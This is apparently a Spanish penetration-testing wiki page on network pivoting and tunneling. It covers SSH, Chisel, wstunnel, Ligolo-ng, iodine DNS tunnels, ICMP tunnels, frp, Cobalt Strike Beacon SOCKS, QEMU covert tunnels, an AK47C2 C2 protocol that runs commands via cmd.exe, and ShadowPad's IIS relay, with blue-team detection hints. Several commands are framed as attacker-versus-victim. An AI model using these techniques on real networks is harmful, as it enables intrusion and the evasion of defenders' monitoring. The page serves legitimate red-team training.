...
> [!WARNING]
> La compatibilidad de Nmap con proxies está limitada a conexiones TCP y no afecta a los escaneos de ping, puertos ni detección del sistema operativo. Cuando el scanner está detrás de un proxy SOCKS, **deshabilita el descubrimiento de hosts** (`-Pn`) y utiliza un **escaneo de conexión TCP** (`-sT`).<sup>[[5]](#references)</sup>

## **Bash**

**Host -> Jump -> InternalA -> InternalB**

El comando final utiliza las opciones `-u` y `-i` de Evil-WinRM para identificar la cuenta y el host de WinRM; su puerto WinRM predeterminado es 5985.<sup>[[4]](#references)</sup>
```bash
...
El forwarding remoto (`-R`) escucha en el servidor SSH y se conecta al lado local; la dirección de bind explícita controla qué interfaces pueden alcanzar ese listener.<sup>[[6]](#references)</sup>
```bash
...
El forwarding dinámico (`-D`) crea un listener SOCKS4/SOCKS5 local cuyas conexiones se abren desde el lado remoto.<sup>[[6]](#references)</sup>
```bash
...
```
Las opciones específicas del host para las máquinas de salto deben colocarse en `~/.ssh/config`; la configuración de línea de comandos destinada al destino no se aplica automáticamente a los hosts intermedios.<sup>[[6]](#references)</sup>
...
Este ejemplo basado en root crea dispositivos de túnel en ambos hosts. El servidor debe permitir el reenvío de tun y la cuenta seleccionada debe tener acceso al dispositivo tun; `PermitRootLogin yes` es una forma de usar la cuenta `root` aquí.<sup>[[6]](#references)[[7]](#references)</sup>\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
...
`sshuttle` proporciona proxy transparente sobre SSH y permite seleccionar subredes y un comando SSH personalizado, como se muestra a continuación.<sup>[[9]](#references)</sup>
```bash
...
`portfwd` de Metasploit admite el forwarding local y remoto, mientras que su módulo de proxy SOCKS está diseñado para funcionar con rutas de sesión o `autoroute` y escucha en el puerto 1080 de forma predeterminada en estos ejemplos.<sup>[[10]](#references)[[11]](#references)[[12]](#references)</sup>
...
Abre un puerto en el Team Server en las interfaces que deben enrutar el tráfico a través del Beacon.<sup>[[13]](#references)</sup>
```bash
beacon> socks 1080
...
> [!WARNING]
> En este caso, el **port se abre en el Beacon host**, no en el Team Server, y el tráfico se envía al Team Server y desde allí al host:port indicado.<sup>[[14]](#references)</sup>
```bash
...
> [!WARNING]
> En este caso, el **puerto se abre en el host de Beacon**, no en el Team Server, y el **tráfico se envía al cliente de Cobalt Strike** (no al Team Server) y desde allí al host:port indicado.<sup>[[14]](#references)</sup>
```bash
...
El proyecto proporciona endpoints de túnel web como `tunnel.aspx`, `tunnel.ashx`, `tunnel.jsp` y `tunnel.php`; sube un endpoint compatible antes de iniciar el proxy local.<sup>[[15]](#references)</sup>
```bash
...
Chisel transporta tráfico TCP/UDP a través de HTTP mediante una conexión protegida por SSH; utiliza builds compatibles de cliente/servidor y verifica la sintaxis de comandos de la release seleccionada.<sup>[[16]](#references)</sup>
...
[`wstunnel`](https://github.com/erebe/wstunnel) transporta reenvíos estáticos o dinámicos mediante WebSocket, HTTP/2 o WebTransport (HTTP/3 sobre QUIC). Las compilaciones actuales admiten TCP, UDP, sockets Unix, stdio, SOCKS5, proxy HTTP y listeners de proxy transparente de Linux, tanto en modos forward como reverse.<sup>[[52]](#references)</sup>

### Pivote SOCKS5 inverso

Ejecuta el servidor en el atacante y haz que el pivot se conecte salientes mediante `-R`. En esta dirección, el listener SOCKS5 se crea en el **servidor**, mientras que las conexiones solicitadas se originan en la red del **cliente/pivot**.<sup>[[52]](#references)</sup>
```bash
...
```
Un forward estático inverso utiliza la misma dirección. Por ejemplo, el siguiente expone `10.10.10.20:445`, tal como se alcanza mediante el pivot, en el puerto de loopback `8445` del atacante:<sup>[[52]](#references)</sup>
```bash
wstunnel client --tls-verify-certificate \
-R 'tcp://127.0.0.1:8445:10.10.10.20:445' wss://pivot.example:443
```
### Detalles de egreso y transporte

- Añade `-p http://user:pass@proxy:8080` al cliente para atravesar un proxy HTTP explícito. Usa `socks5h://127.0.0.1:1080` en clientes como `curl` (o habilita el DNS mediante proxy en la aplicación) para que los nombres internos se resuelvan más allá del túnel en lugar de filtrarse al resolvedor local.<sup>[[52]](#references)</sup>
- `wss://` selecciona WebSocket protegido mediante TLS. Un cliente `https://` selecciona HTTP/2, pero el almacenamiento en búfer o la conversión a HTTP/1 por parte de proxies inversos/CDN suele romper el flujo bidireccional; expón directamente el servidor wstunnel al probar este modo.<sup>[[52]](#references)</sup>
...
> [!WARNING]
> El proyecto upstream advierte que no se debe considerar su certificado autofirmado integrado como protección de la privacidad. Prefiere un certificado personalizado válido junto con `--tls-verify-certificate` (o mTLS), mantén los listeners del proxy en loopback salvo que el acceso remoto sea intencionado y usa protocolos que ya sean seguros cuando la confidencialidad sea importante.<sup>[[52]](#references)</sup>

## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

La guía rápida de Ligolo-ng documenta una interfaz TUN en el proxy, la validación de la huella digital del certificado del agente y la configuración de rutas para la red tunelizada.<sup>[[17]](#references)</sup>
...
Ligolo-ng puede añadir listeners en el agent que reenvían a una dirección del proxy, y su rango reservado `240.0.0.0/4` puede enrutarse para acceder a servicios locales del agent.<sup>[[18]](#references)[[19]](#references)</sup>
```bash
...
Usa `-P` en mayúscula para el puerto SSH. `-pw` se mantiene por compatibilidad, pero expone la contraseña en la lista de procesos; es preferible usar autenticación mediante claves o `-pwfile` cuando sea posible.<sup>[[22]](#references)[[23]](#references)</sup>
...
1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Esta herramienta utiliza `Dynamic Virtual Channels` (`DVC`) de la característica Remote Desktop Service de Windows. DVC se encarga de **tunelizar paquetes a través de la conexión RDP**.
...
**Conéctate** mediante **RDP** y carga y ejecuta en la máquina víctima el binario `SocksOverRDP-Server.exe`:
```
...
Cntlm se autentica en proxies NTLM upstream, expone listeners locales y puede asignar un puerto de túnel local a un servicio de destino; después, los clientes pueden usar ese puerto local.<sup>[[29]](#references)</sup>\
...
```
Ahora, si configuras, por ejemplo, el servicio **SSH** en la víctima para que escuche en el puerto 443, puedes conectarte a él a través del puerto 2222 del atacante.<sup>[[29]](#references)</sup>\
...
Iodine crea un túnel IPv4 mediante consultas DNS y utiliza interfaces TUN; la configuración documentada requiere los privilegios necesarios para crear esas interfaces en ambos extremos.<sup>[[31]](#references)</sup>
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
El transporte DNS tiene una sobrecarga mayor que TCP directo y normalmente es lento; puedes crear una conexión SSH comprimida a través de este túnel utilizando:<sup>[[31]](#references)</sup>
```
...
Proxychains-ng engancha las conexiones TCP enlazadas dinámicamente y no puede transportar UDP ni ICMP; el proxying de DNS es configurable, así que inspecciona el `proxychains.conf` instalado y el helper del resolver en lugar de asumir un resolver público fijo. Los scripts `proxyresolv` legacy exponen `PROXY_DNS_SERVER` para elegir el resolver; usa un resolver accesible desde el pivot cuando se requieran nombres internos.<sup>[[34]](#references)[[35]](#references)</sup>

## Tunnels en Go

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

### C2 de DNS TXT / HTTP JSON personalizado (AK47C2)
...
• Anteponer `1` para *solicitudes de tareas* o `2` para *resultados* y concatena distintos campos (flags, SessionID, nombre del equipo).
...
• Construye un envelope JSON:
```json
{"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
```
• Todo el blob se transforma mediante XOR-`VHBD@H` → hexadecimal → y se envía como el body de un **`POST /`** con la cabecera `Content-Type: text/plain`.
• La respuesta sigue la misma codificación y el campo `cmd` se ejecuta con `cmd.exe /c <command> 2>&1`.

Notas para el Blue Team
• Busca **consultas TXT** inusuales cuyo primer label sea hexadecimal largo y siempre termine en un dominio poco frecuente.
• Una clave XOR constante seguida de ASCII-hex es fácil de detectar con YARA: `6?56484244?484` (`VHBD@H` en hexadecimal).
• Para HTTP, marca los bodies de solicitudes POST `text/plain` que sean hexadecimal puro y tengan un número par de bytes.

{{#note}}
El canal mantiene cada label de subdominio dentro del límite DNS de 63 octetos, pero el cumplimiento del protocolo por sí solo no lo hace sigiloso; los dominios poco frecuentes, los labels hexadecimales largos y el volumen de consultas siguen siendo señales de detección.<sup>[[2]](#references)[[36]](#references)</sup>
{{#endnote}}
...
Hans documenta un tunnel IPv4 sobre ICMP que utiliza un dispositivo TUN y solicitudes de eco ICMP; la configuración requiere privilegios suficientes para crear la interfaz.<sup>[[37]](#references)</sup>
```bash
...
ptunnel-ng transporta conexiones TCP a través de ICMP y utiliza las opciones `-p`, `-l`, `-r` y `-R` que se muestran a continuación para el proxy, el listener local, el host de destino y el puerto de destino.<sup>[[38]](#references)</sup>
```bash
# Generate it
sudo ./autogen.sh
...
_El agent también admite opciones de autenticación y TLS cuando sea necesario.<sup>[[39]](#references)</sup>_
...
#### Tunelización del servicio HTTP interno
...
Esto usa ngrok Agent Config v2; los túneles con nombre utilizan `proto` y `addr` y se inician con `ngrok start`.<sup>[[42]](#references)</sup> Abre 3 túneles:
...
La configuración de túneles administrada localmente utiliza las claves en minúsculas `tunnel`, `credentials-file` y `url`, como se muestra a continuación.<sup>[[46]](#references)</sup>
```bash
...
```
El conector establece conexiones salientes y, de forma predeterminada, negocia QUIC con fallback a HTTP/2; no asumas que todas las implementaciones usan TCP/443. Ejecútalo con solo los privilegios requeridos por tu implementación.<sup>[[43]](#references)[[47]](#references)</sup>

## FRP (Fast Reverse Proxy)

[`frp`](https://github.com/fatedier/frp) es un reverse proxy escrito en Go compatible con **TCP, UDP, HTTP/S, STCP/SUDP, TCPMUX y XTCP**. XTCP utiliza P2P hole punching, cuyo éxito depende de NAT. A partir de **v0.53.0**, puede actuar como **SSH Tunnel Gateway**, de modo que un host objetivo puede utilizar el cliente OpenSSH estándar sin un binario `frpc`.<sup>[[48]](#references)[[49]](#references)[[50]](#references)</sup>
...
remotePort = 5000
```
### Uso del nuevo gateway SSH (sin el binario frpc)
```bash
# On frps (attacker)
...
```
El comando anterior publica el puerto **8080** de la víctima como **attacker_ip:9000** utilizando el cliente OpenSSH estándar, mientras `frps` proporciona el gateway.<sup>[[50]](#references)</sup>

## Túneles encubiertos basados en VM con QEMU

La red en modo usuario de QEMU no requiere privilegios de root ni de administrador para la red virtual, y `-netdev user,hostfwd=...` redirige conexiones TCP, UDP o UNIX desde el host al guest.<sup>[[51]](#references)</sup> TrustedSec documentó una VM de Tiny Core con QEMU y un intento de túnel SSH inverso en un incidente en el que un EDR centrado en el host podía pasar por alto la actividad dentro del guest.<sup>[[1]](#references)</sup>
...
El incidente citado describe la persistencia en el guest stateless Tiny Core mediante `/opt/bootlocal.sh` y `/opt/filetool.lst`:<sup>[[1]](#references)</sup>
...
• Es posible que los análisis de procesos realizados únicamente en el host no inspeccionen los procesos del guest, pero la virtualización no garantiza la evasión; la telemetría de red, QEMU y de la imagen todavía puede exponerlo.<sup>[[1]](#references)[[51]](#references)</sup>
...
• Buscar puertos de escucha poco frecuentes (2222, 10022, …) que se enlacen inmediatamente después del lanzamiento de QEMU.

## Nodos relay de IIS/HTTP.sys mediante `HttpAddUrl` (ShadowPad)

Check Point describe el módulo IIS de ShadowPad como un componente que convierte servidores web perimetrales comprometidos en nodos backdoor y relay al enlazar prefijos de URL mediante `HttpAddUrl`.<sup>[[3]](#references)</sup>
...
* **Valores predeterminados de configuración** – si la configuración JSON del módulo omite valores, este recurre a valores predeterminados plausibles de IIS (`Server: Microsoft-IIS/10.0`, `DocumentRoot: C:\inetpub\wwwroot`, `ErrorPage: C:\inetpub\custerr\en-US\404.htm`). De esta forma, IIS responde al tráfico benigno con la identidad visual correcta.
* **Interceptación wildcard** – los operadores proporcionan una lista de prefijos de URL separados por punto y coma (wildcards en el host y la ruta). El módulo llama a `HttpAddUrl` para cada entrada, por lo que HTTP.sys dirige las solicitudes coincidentes al handler malicioso; las solicitudes no coincidentes vuelven al comportamiento normal de IIS.
...
* **Orquestación del relay** – el módulo mantiene dos listas: “servers” (nodos upstream) y “clients” (implants downstream). Las entradas se eliminan si no reciben un heartbeat en aproximadamente 30 segundos. Cuando ambas listas no están vacías, empareja el primer server disponible con el primer client disponible y simplemente canaliza los bytes entre sus sockets hasta que uno de los lados se cierra.
...
## Otras herramientas que conviene comprobar
...
- [1] [Ocultos entre las sombras: túneles encubiertos mediante virtualización de QEMU](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
...
- [41] [hosts virtuales de ngrok](https://ngrok.com/docs/using-ngrok-with/virtualHosts)
